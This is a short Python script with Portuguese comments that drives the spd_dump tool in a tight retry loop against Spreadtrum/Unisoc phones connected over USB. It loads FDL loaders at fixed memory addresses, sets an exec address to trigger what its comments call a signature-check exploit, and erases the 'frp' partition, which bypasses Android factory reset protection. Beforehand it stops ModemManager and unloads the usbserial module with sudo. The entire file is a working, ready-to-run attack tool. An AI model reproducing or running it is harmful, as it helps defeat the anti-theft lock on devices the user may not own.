import subprocess
import time
import sys
import os

# Configurações de caminho
SPD_DUMP = "./spd_dump"
FDL1 = "fdl1-dl.bin"
FDL2 = "fdl2-dl.bin"
ADDR1 = "0x65000800"
ADDR2 = "0x9efffe00"
EXEC_ADDR = "0x65015f08"

def hammer():
    print("=== INICIANDO HAMMER RESET LOOP (AGRESSIVO) ===")
    print("[*] Segure VOLUME BAIXO e conecte o cabo USB.")
    print("[*] Pressione CTRL+C para parar.")
    
    count = 0
    while True:
        try:
            # Comando de ataque usando o exploit de assinatura
            # --wait 0 faz o spd_dump tentar uma única vez e sair instantaneamente
            cmd = [
                "sudo", SPD_DUMP, "--wait", "0",
                "fdl", FDL1, ADDR1,
                "fdl", FDL2, ADDR2,
                "exec_addr", EXEC_ADDR,
                "exec", "e", "frp", "reset"
            ]
            
            # Executa de forma silenciosa e rápida
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            count += 1
            if count % 50 == 0:
                print(f"[*] Tentativas: {count}...", end="\r")

            # Se o código de saída for 0, o spd_dump conseguiu injetar!
            if result.returncode == 0:
                print("\n\n" + "="*30)
                print("!!! SUCESSO DETECTADO !!!")
                print("="*30)
                print(result.stdout)
                break
                
        except KeyboardInterrupt:
            print("\n[!] Ataque interrompido pelo usuário.")
            sys.exit(0)
        except Exception as e:
            pass

if __name__ == "__main__":
    if not os.path.exists(SPD_DUMP):
        print(f"[!] Erro: spd_dump não encontrado em {os.getcwd()}")
        sys.exit(1)
    
    # Prepara o sistema
    os.system("sudo systemctl stop ModemManager")
    os.system("sudo modprobe -r usbserial")
    
    hammer()
